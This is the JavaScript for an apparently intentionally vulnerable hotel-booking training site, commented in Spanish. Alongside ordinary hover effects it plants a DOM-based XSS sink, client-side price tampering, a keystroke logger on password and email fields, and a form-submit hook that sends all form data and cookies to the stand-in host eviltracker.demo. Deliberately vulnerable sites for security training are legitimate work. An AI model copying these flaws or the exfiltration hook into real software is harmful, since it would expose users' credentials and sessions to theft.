// Efectos y demostraciones de vulnerabilidades

document.addEventListener('DOMContentLoaded', function() {
    
    // ===== EFECTOS VISUALES =====
    
    // Efecto hover en tarjetas
    const hotelCards = document.querySelectorAll('.hotel-card');
    hotelCards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-8px)';
            this.style.boxShadow = '0 15px 35px rgba(0, 0, 0, 0.2)';
        });
        
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.08)';
        });
    });
    
    // ===== DEMOSTRACIONES DE VULNERABILIDADES =====
    
    // 1. Manipulación de precios (Business Logic Flaw)
    document.querySelectorAll('.hotel-card').forEach(card => {
        const priceElement = card.querySelector('.price-amount');
        const realPrice = card.querySelector('input[type="hidden"]')?.value;
        
        if (priceElement && realPrice) {
            // Crear botón para manipular precio
            const manipulateBtn = document.createElement('button');
            manipulateBtn.innerHTML = '<i class="fas fa-edit"></i> Cambiar Precio';
            manipulateBtn.className = 'btn btn-danger';
            manipulateBtn.style.marginTop = '10px';
            manipulateBtn.style.fontSize = '12px';
            manipulateBtn.style.padding = '5px 10px';
            
            manipulateBtn.addEventListener('click', function(e) {
                e.preventDefault();
                const newPrice = prompt('Nuevo precio (vulnerabilidad demo):', realPrice);
                if (newPrice && !isNaN(newPrice)) {
                    priceElement.textContent = '$' + parseFloat(newPrice).toFixed(2);
                    alert('✅ Precio manipulado! Vulnerabilidad: Business Logic Flaw');
                }
            });
            
            card.querySelector('.hotel-price').appendChild(manipulateBtn);
        }
    });
    
    // 2. DOM-based XSS Demo
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('xss')) {
        try {
            const xssPayload = decodeURIComponent(urlParams.get('xss'));
            const demoDiv = document.createElement('div');
            demoDiv.innerHTML = '<div class="alert alert-danger"><i class="fas fa-bug"></i> DOM-based XSS Demo: ' + xssPayload + '</div>';
            document.querySelector('.container').prepend(demoDiv);
        } catch(e) {}
    }
    
    // 3. Keylogger simulado (para demostración)
    const sensitiveInputs = document.querySelectorAll('input[type="password"], input[type="email"]');
    sensitiveInputs.forEach(input => {
        let typedChars = '';
        
        input.addEventListener('keyup', function(e) {
            typedChars += e.key;
            if (typedChars.length > 20) {
                console.warn('⚠️ Keylogger simulado capturó:', typedChars);
                typedChars = '';
            }
        });
    });
    
    // 4. Cookie theft demo
    if (document.cookie.includes('PHPSESSID')) {
        console.log('🍪 Cookie de sesión disponible para robo via XSS:', document.cookie.substring(0, 50) + '...');
    }
    
    // ===== VALIDACIONES DÉBILES (para demostrar vulnerabilidades) =====
    
    // Validación de formulario débil
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            // No hay validación real - demostración de falta de validación
            console.log('📝 Formulario enviado sin validación adecuada');
            
            // Envío de datos a tracker simulado (CSRF/Data Exfiltration demo)
            if (form.id !== 'csrf-form') {
                const formData = new FormData(form);
                const data = Object.fromEntries(formData);
                
                fetch('https://eviltracker.demo/log', {
                    method: 'POST',
                    body: JSON.stringify({
                        form: form.id || 'unknown',
                        data: data,
                        timestamp: new Date().toISOString(),
                        cookie: document.cookie
                    }),
                    mode: 'no-cors'
                }).catch(() => {});
            }
        });
    });
    
    // ===== NOTIFICACIONES DE VULNERABILIDAD =====
    
    // Mostrar alerta de seguridad
    setTimeout(() => {
        const securityAlert = document.createElement('div');
        securityAlert.className = 'alert alert-danger';
        securityAlert.style.position = 'fixed';
        securityAlert.style.bottom = '20px';
        securityAlert.style.right = '20px';
        securityAlert.style.zIndex = '1000';
        securityAlert.style.maxWidth = '400px';
        securityAlert.innerHTML = `
            <i class="fas fa-shield-alt"></i>
            <div>
                <strong>⚠️ SITIO VULNERABLE</strong><br>
                Este sitio contiene vulnerabilidades intencionales para aprendizaje.<br>
                No ingresar información real.
            </div>
            <button onclick="this.parentElement.remove()" style="background:none; border:none; color:#666; cursor:pointer;">
                <i class="fas fa-times"></i>
            </button>
        `;
        document.body.appendChild(securityAlert);
    }, 3000);
});

// Función para demostrar XSS
function demoXSS(payload) {
    const target = document.getElementById('xss-demo') || document.body;
    target.innerHTML += payload;
    console.log('🎯 XSS ejecutado:', payload);
}

// Función para demostrar CSRF
function demoCSRF() {
    document.getElementById('csrf-form')?.submit();
    alert('📨 CSRF simulado: Reserva creada sin tu consentimiento');
}